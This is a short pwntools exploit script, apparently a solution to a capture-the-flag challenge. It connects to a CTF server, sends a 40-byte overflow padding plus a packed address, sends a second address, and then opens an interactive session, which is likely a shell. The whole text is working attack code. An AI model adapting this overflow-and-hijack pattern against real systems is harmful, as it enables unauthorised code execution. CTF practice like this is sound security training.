from pwn import *

r=remote("ctf.j0n9hyun.xyz",3016)

payload = "A"*40
payload += p64(0x601068)

#pause()
r.sendline(payload)

payload =p64(0x400826)
r.sendline(payload)

r.interactive()
